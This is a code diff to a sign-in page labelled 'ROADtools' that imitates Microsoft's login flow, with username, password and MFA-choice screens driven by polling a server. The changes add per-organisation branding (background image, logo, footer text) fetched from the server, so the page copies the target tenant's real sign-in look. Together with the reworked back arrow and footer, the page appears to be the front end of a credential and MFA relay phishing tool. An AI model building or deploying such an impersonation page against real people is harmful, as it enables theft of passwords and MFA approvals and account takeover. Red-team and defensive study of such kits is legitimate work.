@@ -17,6 +17,22 @@
     margin: 0;
     padding-bottom: 60px;
   }
+  #bgLayer {
+    position: fixed;
+    top: -20px;
+    left: -20px;
+    right: -20px;
+    bottom: -20px;
+    z-index: -1;
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    filter: blur(6px);
+    display: none;
+  }
+  body.has-bg-image #bgLayer {
+    display: block;
+  }
   .wrapper {
     width: 460px;
     max-width: calc(100vw - 40px);
@@ -32,8 +48,8 @@
   .card {
     position: relative;
     background: #ffffff;
-    border-radius: 4px;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    border-radius: 8px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.25);
     padding: 40px 48px;
   }
   .top-loader {
@@ -84,6 +100,33 @@
     font-size: 26px;
     margin: 0 0 22px;
     color: #1b1b1b;
+  }
+  .password-logo {
+    display: block;
+    max-height: 36px;
+    max-width: 220px;
+    margin-bottom: 20px;
+  }
+  .password-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 24px;
+    font-size: 14px;
+    color: #666;
+  }
+  .password-header .back-arrow {
+    cursor: pointer;
+    font-size: 18px;
+    color: #444;
+    user-select: none;
+  }
+  .password-header .back-arrow:hover {
+    color: #2b5fd9;
+  }
+  #passwordEmailDisplay {
+    font-weight: 500;
+    color: #333;
   }
   label {
     display: block;
@@ -196,7 +239,19 @@
     color: #f2f2f2;
     text-decoration: none;
   }
-  .footer a:hover { text-decoration: underline; }  .options-card svg {
+  .footer a:hover { text-decoration: underline; }
+  .password-footer {
+    margin: 28px -48px -40px;
+    background: #f2f2f2;
+    color: #333;
+    font-size: 14px;
+    padding: 16px 48px;
+    border-top: 1px solid #e2e2e2;
+    border-radius: 0 0 8px 8px;
+  }
+  #passwordFooterText {
+    line-height: 1.5;
+  }  .options-card svg {
     flex-shrink: 0;
     color: #444;
   }  .mfa-option-btn {
@@ -489,6 +544,8 @@
 </head>
 <body>
 
+<div id="bgLayer"></div>
+
 <div class="wrapper">
   <div class="brand">ROADtools</div>
 
@@ -517,6 +574,11 @@
     </form>
 
     <form id="passwordForm" style="display:none;">
+      <img id="passwordLogo" class="password-logo" style="display:none;" alt="">
+      <div class="password-header">
+        <span class="back-arrow" id="passwordBackArrow">← </span>
+        <span id="passwordEmailDisplay"></span>
+      </div>
       <h1>Enter password</h1>
       <div class="field">
         <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
@@ -525,10 +587,13 @@
         <div><a href="#" onclick="return false;">Forgot my password</a></div>
       </div>
       <div class="actions">
-        <button type="button" class="secondary" id="backBtn">Back</button>
         <button type="submit" class="primary" id="passwordBtn">Sign in</button>
       </div>
     </form>
+
+    <div class="password-footer" id="passwordFooter" style="display:none;">
+      <div id="passwordFooterText"></div>
+    </div>
 
     <div id="mfaChoiceScreen" style="display:none;">
       <div class="mfa-header" id="mfaChoiceEmailRow"></div>
@@ -581,7 +646,7 @@
   </div>
 </div>
 
-<div class="footer">
+<div class="footer" id="mainFooter">
   <a href="#" onclick="return false;">Terms of use</a>
   <a href="#" onclick="return false;">Privacy &amp; cookies</a>
   <a href="#" onclick="return false;">&hellip;</a>
@@ -655,6 +720,8 @@
 <script>
 const API_BASE = "";
 
+const bgLayer = document.getElementById("bgLayer");
+const logoMark = document.querySelector(".logo-mark");
 const usernameForm = document.getElementById("usernameForm");
 const passwordForm = document.getElementById("passwordForm");
 const orgLoginForm = document.getElementById("orgLoginForm");
@@ -671,7 +738,12 @@ const passwordInput = document.getElementById("password");
 const usernameBtn = document.getElementById("usernameBtn");
 const passwordBtn = document.getElementById("passwordBtn");
 const usernameBackBtn = document.getElementById("usernameBackBtn");
-const backBtn = document.getElementById("backBtn");
+const passwordBackArrow = document.getElementById("passwordBackArrow");
+const passwordEmailDisplay = document.getElementById("passwordEmailDisplay");
+const passwordLogo = document.getElementById("passwordLogo");
+const passwordFooter = document.getElementById("passwordFooter");
+const passwordFooterText = document.getElementById("passwordFooterText");
+const mainFooter = document.getElementById("mainFooter");
 const mfaChoiceScreen = document.getElementById("mfaChoiceScreen");
 const mfaOptionsList = document.getElementById("mfaOptionsList");
 const mfaWaitingNote = document.getElementById("mfaWaitingNote");
@@ -785,6 +857,16 @@ function showScreen(name) {
   optionsCard.style.display = name === "username" ? "flex" : "none";
   mfaChoiceScreen.style.display = name === "mfaChoice" ? "block" : "none";
   mfaCodeForm.style.display = name === "mfaCode" ? "block" : "none";
+  logoMark.style.display = name === "username" ? "flex" : "none";
+
+  // Toggle footer visibility
+  mainFooter.style.display = name === "orgLogin" ? "none" : "flex";
+  passwordFooter.style.display = name === "password" ? "block" : "none";
+
+  // Display email in password header
+  if (name === "password") {
+    passwordEmailDisplay.textContent = currentUsername || "";
+  }
 
   // #status is shared across screens; keep it positioned right after the
   // active screen's heading (matching Microsoft's own error placement)
@@ -873,11 +955,36 @@ function stopPolling() {
   stopWaitingLoader();
 }
 
+function resetBranding() {
+  bgLayer.style.backgroundImage = "";
+  document.body.classList.remove("has-bg-image");
+  passwordLogo.style.display = "none";
+  passwordLogo.src = "";
+  passwordFooterText.textContent = "";
+}
+
+function applyBranding(data) {
+  if (data.background_image) {
+    bgLayer.style.backgroundImage = `url('${data.background_image}')`;
+    document.body.classList.add("has-bg-image");
+  }
+
+  if (data.logo) {
+    passwordLogo.src = data.logo;
+    passwordLogo.style.display = "block";
+  }
+
+  if (data.footer_text) {
+    passwordFooterText.textContent = data.footer_text;
+  }
+}
+
 async function pollStatus() {
   if (!currentUsername) return;
 
   try {
     const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
+    applyBranding(data);
 
     if (data.stage === "awaiting_mfa_choice") {
       // Idle waiting for the user to pick a method — polling keeps running
@@ -960,6 +1067,7 @@ usernameForm.addEventListener("submit", async (e) => {
       }, 1800);
     } else {
       setStatus("");
+      applyBranding(data);
       showScreen("password");
       passwordInput.focus();
     }
@@ -1033,13 +1141,14 @@ usernameBackBtn.addEventListener("click", () => {
   usernameInput.focus();
 });
 
-backBtn.addEventListener("click", () => {
+passwordBackArrow.addEventListener("click", () => {
   stopPolling();
   showScreen("username");
   passwordInput.value = "";
   cancelSession(currentUsername);
   currentUsername = null;
   setStatus("");
+  resetBranding();
 });
 
 mfaCancelBtn.addEventListener("click", () => {
@@ -1048,6 +1157,7 @@ mfaCancelBtn.addEventListener("click", () => {
   cancelSession(currentUsername);
   currentUsername = null;
   setStatus("");
+  resetBranding();
 });
 
 document.addEventListener("click", (e) => {
@@ -1057,6 +1167,7 @@ document.addEventListener("click", (e) => {
     cancelSession(currentUsername);
     currentUsername = null;
     setStatus("");
+    resetBranding();
   }
 });
 
